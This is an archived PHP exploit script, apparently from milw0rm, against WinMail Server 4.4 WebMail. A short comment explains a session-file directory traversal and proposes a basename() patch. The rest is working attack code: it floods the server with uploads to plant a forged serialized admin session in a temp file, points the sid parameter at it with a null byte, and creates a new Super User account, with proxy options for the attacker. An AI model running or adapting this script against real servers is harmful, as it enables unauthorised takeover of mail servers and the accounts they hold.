<html><head><title>WinMail Server 4.4 build 1124 (WebMail) Remote Add Super User Exploit</title></head><pre>&lt;?php
/*  WinMail Server 4.4 build 1124 (WebMail) remote add new Super User exploit
 *  by rgod
 *
 *  software site: http://www.magicwinmail.net/download.asp
 *
 *
 *  vulnerable code in /inc/class.session.php at lines 8-25:
 *  ...
 *	 function Load() {
 *		$result      = Array();
 *
 *		$sessionfile = $this-&gt;temp_folder.&quot;_sessions/&quot;.$this-&gt;sid.&quot;.sess&quot;;
 *		if(!file_exists($sessionfile))
 *			return false;
 *
 *		$size = filesize($sessionfile);
 *
 *		$fp = fopen($sessionfile, &quot;rb&quot;);
 *		if ($fp){
 *			$result = fread($fp, $size);
 *			fclose($fp);
 *		}
 *		$result = unserialize(base64_decode($result));
 *
 * 		return $result;
 *	}
 * ...
 *
 * This function should check for session files located	in /temp/_sessions
 * folder outside of the www path. But the &quot;sid&quot; argument is not checked
 * for directory traversal attacks. So you can supply a path to an arbitrary
 * file, ex: a temporary uploaded file with well crafted content.
 *
 * phpinfo() shows that the value for upload_tmp_dir is not set, so the folder
 * used to store this files becomes /windows/temp or /winnt/temp.
 *
 * also magic_quotes_gpc = off and open_basedir is not set, so...
 *
 * http://target:6080/admin/main.php?sid=../../../../../../windows/temp/phpFFFF.tmp%00
 *
 * set the magicwinmail_session_id cookie to the same value and you will have admin
 * access!
 *
 * This script uploads a large amount of temporary files to quickly reach
 * the ffff index and quickly call the main script before the temporary file is deleted
 * to set a new Super User account.
 *
 * Possible patch:
 *
 * ...
 * $sessionfile = $this-&gt;temp_folder.&quot;_sessions/&quot;.basename($this-&gt;sid).&quot;.sess&quot;;
 * ...
 *
*/

if ($argc&lt;2) {
    print_r('
Usage: php '.$argv[0].' host OPTIONS
host:      target server (ip/hostname)
Options:
 -p[port]:    specify a port other than 6080
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost -P1.1.1.1:8080
php '.$argv[0].' localhost -p81
');
    die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],(int)$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function sendii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex, $ssock;
  if ($proxy=='') {
    $ssock=fsockopen(gethostbyname($host),$port);
    if (!$ssock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ssock=fsockopen($parts[0],$parts[1]);
    if (!$ssock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ssock,$packet);
}

$host=$argv[1];
$path=$argv[2];
$port=6080;
$proxy=&quot;&quot;;
for ($i=3; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp==&quot;-p&quot;)
{
  $port=(int)str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}

$____suntzu=array();
$____suntzu[&quot;user&quot;]=&quot;admin&quot;;
$____suntzu[&quot;pass&quot;]=&quot;suntzu&quot;;
$____suntzu[&quot;usertype&quot;]=&quot;0&quot;;
$____suntzu[&quot;adminrange&quot;]=&quot;&quot;;
$____suntzu[&quot;auth&quot;]=&quot;1&quot;;
$____suntzu[&quot;start&quot;]=&quot;9999999999&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;mailstore_directory&quot;]=&quot;C:\\&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;netstore_driectory&quot;]=&quot;C:\\&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;postmaster_address&quot;]=&quot;postmaster@server.com&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;congratulate_subject&quot;]=&quot;welcome&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;congratulate_content&quot;]=&quot;hi&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;ldap_base_dn&quot;]=&quot;o=magicwinmail&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;ldap_root_dn&quot;]=&quot;o=magicwinmail&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;ldap_root_pwd&quot;]=&quot;9999999999&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;allow_webadmin&quot;]=&quot;1&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;idle_timeout&quot;]=&quot;1800&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;enable_cookies&quot;]=&quot;&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;smtp_server&quot;]=&quot;127.0.0.1&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;smtp_port&quot;]=&quot;25&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;ldap_server&quot;]=&quot;127.0.0.1&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;ldap_port&quot;]=&quot;309&quot;;
$____suntzu[&quot;initconfig&quot;][&quot;register_user_total&quot;]=&quot;20&quot;;
$____suntzu[&quot;mainpage&quot;]=&quot;1&quot;;
$____suntzu[&quot;accountstatus&quot;]=&quot;2&quot;;
$____suntzu[&quot;expiretime&quot;]=&quot;2592000&quot;;
$____suntzu[&quot;searchtype&quot;]=&quot;&quot;;

$my_magic_string=serialize($____suntzu);
$my_magic_string=base64_encode($my_magic_string);

echo &quot;magic string -&gt; &quot;.$my_magic_string.&quot;\n&quot;;

//fill with possible locations
$my_path=array(&quot;../../../../../../winnt/temp/&quot;,
               &quot;../../../../../../windows/temp/&quot;,
	       &quot;../../../../../winnt/temp/&quot;,
               &quot;../../../../../windows/temp/&quot;);

$my_file=&quot;phpFFFF.tmp&quot;; //change, if u want
$my_admin=&quot;akira&quot;;
$my_pass=&quot;akira&quot;;
$my_retries=9999;

echo &quot;Please wait ...\n&quot;;

for ($j=0; $j&lt;count($my_path); $j++){
    for ($i=0; $i&lt;$my_retries; $i++){
        $data=&quot;&quot;;
        for ($k=1; $k&lt;=999; $k++){
            $data.=&quot;-----------------------------7d6224c08dc\n&quot;.
            &quot;Content-Disposition: form-data; name=\&quot;suntzu[$i][$k]\&quot;; filename=\&quot;suntzoi$i$k\&quot;;\n\n&quot;.
            $my_magic_string.&quot;\n&quot;;
        }
        $data.=&quot;-----------------------------7d6224c08dc--\n&quot;;
        $packet=&quot;POST /admin/main.php HTTP/1.1\r\n&quot;. //a time consuming script
        &quot;Host: &quot;.$host.&quot;\r\n&quot;.
        &quot;Accept: text/plain\r\n&quot;.
        &quot;Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n&quot;.
        &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;.
        &quot;Connection: Keep-Alive\r\n\r\n&quot;.
        $data;
        sendii($packet);

        $sid=urlencode($my_path[$j].$my_file.&quot;\x00&quot;);

        $data=&quot;dest=adminuser&quot;.
        &quot;&amp;sub_action=added&quot;.
        &quot;&amp;sid=$sid&quot;.
        &quot;&amp;lid=0&quot;.
        &quot;&amp;tid=0&quot;.
        &quot;&amp;adminrange=&quot;.
        &quot;&amp;oldpassword=&quot;.
        &quot;&amp;username=&quot;.urlencode($my_admin).
        &quot;&amp;password=&quot;.urlencode($my_pass).
        &quot;&amp;confirmpwd=&quot;.urlencode($my_pass).
        &quot;&amp;description=suntzuuuuu&quot;.
        &quot;&amp;usertype=0H&quot;;
        $packet=&quot;POST /admin/main.php HTTP/1.1\r\n&quot;.
        &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;.
        &quot;Referer: http://$host:$port/admin/main.php\r\n&quot;.
        &quot;Accept-Language: it\r\n&quot;.
        &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
        &quot;Accept-Encoding: text/plain\r\n&quot;.
        &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n&quot;.
        &quot;Host: $host:$port\r\n&quot;.
        &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;.
        &quot;Connection: Close\r\n&quot;.
        &quot;Cache-Control: no-cache&quot;.
        &quot;Cookie: magicwinmail_session_id=$sid; magicwinmail_admin_default_theme=admindefault; magicwinmail_admin_default_language=en; magicwinmail_admin_default_domain=server.com; magicwinmail_default_theme=default; magicwinmail_default_language=en; magicwinmail_domain_name=server.com; magicwinmail_login_userid=postmaster\r\n\r\n&quot;.
        $data;
        send($packet);

        fclose($ssock);

        $data=&quot;f_user=&quot;.urlencode($my_admin).
        &quot;&amp;f_pass=&quot;.urlencode($my_pass).
        &quot;&amp;lng=0&quot;.
        &quot;&amp;sid=&quot;.
        &quot;&amp;tid=&quot;.
        &quot;&amp;dest=login&quot;;
        $packet=&quot;POST /admin/login.php HTTP/1.0\r\n&quot;.
        &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;.
        &quot;Referer: http://$host:$port/admin/login.php\r\n&quot;.
        &quot;Accept-Language: en\r\n&quot;.
        &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
        &quot;User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n&quot;.
        &quot;Host: $host:$port\r\n&quot;.
        &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;.
        &quot;Pragma: no-cache\r\n&quot;.
        &quot;Cookie: magicwinmail_admin_default_theme=admindefault; magicwinmail_admin_default_language=en; magicwinmail_admin_default_domain=server.com; magicwinmail_default_theme=default; magicwinmail_default_language=en; magicwinmail_domain_name=server.com; magicwinmail_login_userid=postmaster\r\n&quot;.
        &quot;Connection: Close\r\n\r\n&quot;.
        $data;
        send($packet);
	if (!eregi(&quot;badlogin&quot;,$html)){die(&quot;Done! Login to the admin panel with username \&quot;$my_admin\&quot; and pass \&quot;$my_pass\&quot;\n&quot;);}
    }
}
//if you are here...
echo &quot;exploit failed...&quot;;
?&gt;

# milw0rm.com [2007-04-01]</pre></html>